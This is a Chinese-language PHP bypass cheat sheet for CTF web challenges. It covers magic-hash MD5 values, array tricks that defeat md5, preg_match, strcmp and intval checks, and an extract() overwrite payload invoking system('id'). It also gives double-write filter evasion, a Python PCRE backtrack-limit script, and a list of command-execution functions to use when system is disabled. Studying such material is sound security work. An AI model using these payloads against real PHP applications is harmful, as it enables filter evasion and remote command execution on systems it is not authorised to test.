# PHP 绕过技巧速查表

## PHP 弱比较绕过（$a == md5($a)）

PHP 弱类型比较中，`0e` 开头的字符串被当作科学计数法，等于 `0`。

**⚠️ 关键条件：`0e` 后必须全是数字（0-9），不能含字母！**
- ✅ `0e830400451993494058024219903391` → 纯数字，PHP 当作 `0 × 10^830...` = `0`
- ❌ `0e993dffb88165eb32369e16dd25b536` → 含字母 `d`/`f`，PHP 不当作科学计数法，按字符串比较

| 值 | MD5 结果 | 0e后纯数字? | 说明 |
|----|---------|------------|------|
| QNKCDZO | 0e830400451993494058024219903391 | ✅ | 0e 开头，PHP `==` 视为 0 |
| 240610708 | 0e462097431906509019562988736854 | ✅ | 同上 |
| s878926199a | 0e545993274517709034328855841020 | ✅ | 同上 |
| s155964671a | 0e342768416822451524974117254469 | ✅ | 同上 |
| s214587387a | 0e848204310308006290363795692068 | ✅ | 同上 |
| s1091221200a | 0e940625744785414655937625828514 | ✅ | 同上 |
| 0e215962017 | 0e291242476940776845150308577824 | ✅ | 同上 |

**⚠️ 不要自己暴力搜索 md5 碰撞值** — 直接用上表中的值，它们已验证可用。

## PHP 弱比较绕过（$a != $b && md5($a) == md5($b)）

**⚠️ 关键条件：`0e` 后必须全是数字（0-9），不能含字母！**

| 值 A | 值 B | MD5(值 A) | MD5(值 B) | 0e后纯数字? |
|------|------|----------|----------|------------|
| QNKCDZO | 240610708 | 0e830400... | 0e462097... | ✅ 都可以 |
| s878926199a | s155964671a | 0e545993... | 0e342768... | ✅ 都可以 |
| QNKCDZO | s878926199a | 0e830400... | 0e545993... | ✅ 都可以 |

**⚠️ 暴力搜索的 md5 值通常不可用** — `0e993dffb...` 含字母 d/f，PHP 不当作科学计数法，弱比较失败。直接用上表已验证值。

## PHP 严格比较绕过（$a !== $b && md5($a) === md5($b)）

`md5()` 无法处理数组，传入数组返回 `NULL`，`NULL === NULL` 为 `true`：
```
?a[]=1&b[]=2
md5($_GET['a']) === md5($_GET['b'])  // NULL === NULL → true
```

## 数组绕过

`preg_match()` 只能处理字符串，传入数组返回 `false`：
```
?p[]=nss2&p[]=ctf
// preg_match("/n|c/", $_GET['p']) → false（不匹配，绕过）
```

`call_user_func` 接受数组作为回调：
```php
call_user_func(array('ClassName', 'methodName'))  // 等价于 ClassName::methodName()
call_user_func(['nss2', 'ctf'])                   // 等价于 nss2::ctf()
```

## extract() 变量覆写

`extract($_GET)` 会用 GET 参数覆盖已有变量：
```
?_GET[cmd]=system('id')
```

## intval() 绕过

```php
if (intval($_GET['num']) === 0) { ... }
// 绕过方式：
?num=0x10     // 十六进制，intval 默认不解析
?num=+0       // 正号前缀
?num=0e123    // 科学计数法
?num[]=1      // 数组，intval 返回 1
```

## PHP 正则绕过

| 场景 | 方法 | 示例 |
|------|------|------|
| 正则无 `i` 修饰符 | 大小写绕过 | `Nss2::Ctf` 绕过 `/n\|c/m` |
| preg_match 只检查字符串 | 数组绕过 | `p[]=xxx` 使 preg_match 返回 false |
| `^$` + `m` 修饰符 | 换行绕过 | `aaa%0abbb` 绕过 `/^aaa$/m` |
| `.` 不匹配换行 | `%0a` 绕过 | 插入换行符 |
| 回溯限制 | 超长字符串 | 构造超长字符串让 preg_match 返回 false（PCRE 回溯限制默认 100 万） |

### ⭐ preg_replace 双写绕过（高频考点）

**场景**：`preg_replace('/关键词/', '', $input)` 替换后需要结果**等于关键词本身**

**核心原理**：在关键词中间嵌入完整关键词，替换内层后外层拼合出原词

**通用构造**：`关键词前半 + 关键词 + 关键词后半`

| 过滤关键词 | 双写输入 | 替换过程 | 结果 |
|-----------|---------|---------|------|
| NSSCTF | `NSSNSSCTFCTF` | 删除中间 NSSCTF → NSS+CTF | `NSSCTF` ✅ |
| flag | `flflagag` | 删除中间 flag → fl+ag | `flag` ✅ |
| cat | `cacatt` | 删除中间 cat → ca+t | `cat` ✅ |
| system | `syssystemtem` | 删除中间 system → sys+tem | `system` ✅ |
| hack | `hahackck` | 删除中间 hack → ha+ck | `hack` ✅ |

**⚠️ 为什么大小写绕过不行**：
- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` 不匹配 `NSS` → 原样返回 `NssCTF`
- `NssCTF !== "NSSCTF"` → 严格比较失败 → 不通过
- 双写绕过是唯一能让替换结果**精确等于原字符串**的方法

**识别信号**：
- 源码含 `preg_replace('/X/', '', $str)` 且 `$str === "X"` → 双写绕过
- 源码含 `str_replace('X', '', $str)` 且 `$str === "X"` → 同样适用双写绕过

### PCRE 回溯限制绕过

```python
import httpx
url = "http://target/index.php"
# 构造超长字符串让 preg_match 回溯超限返回 false
payload = "a" * 1000000 + "evil_content"
data = {"input": payload}
r = httpx.post(url, data=data)
print(r.text)
```

## PHP 函数/特性绕过速查

| 场景 | 方法 | 示例 |
|------|------|------|
| 正则无 `i` | 大小写绕过 | `Nss2::Ctf` 绕过 `/n\|c/m` |
| preg_match 字符串限制 | 数组绕过 | `p[]=nss2&p[]=ctf` |
| call_user_func 调类方法 | 数组回调 | `call_user_func(['nss2','ctf'])` |
| 函数名含被禁字符 | 找替代函数 | `readfile` 不含 n/c |
| extract 变量覆写 | 覆盖关键变量 | 修改认证/权限相关变量 |
| is_numeric 检查 | 十六进制/科学计数法 | `0x10`、`1e1` |
| strcmp 比较 | 数组绕过 | `pass[]=1` 使 strcmp 返回 NULL |
| in_array 弱类型 | 类型欺骗 | `"0admin"` 通过 `in_array(0, ['admin'])` |

## PHP 代码执行替代函数

当 `system` / `exec` 被禁时：

| 函数 | 用法 | 回显 |
|------|------|------|
| `system($cmd)` | 直接执行 | 有回显（输出到 stdout） |
| `exec($cmd, $output)` | 执行并存入数组 | 无直接回显，需 `print_r($output)` |
| `passthru($cmd)` | 直接执行输出原始数据 | 有回显 |
| `shell_exec($cmd)` | 返回字符串 | 无回显，需 `echo` |
| `反引号 \`$cmd\`` | 等价于 shell_exec | 无回显，需 `echo` |
| `popen($cmd, 'r')` | 打开进程管道 | 需 `fread` 读取 |
| `proc_open()` | 更灵活的进程控制 | 需手动读取 |
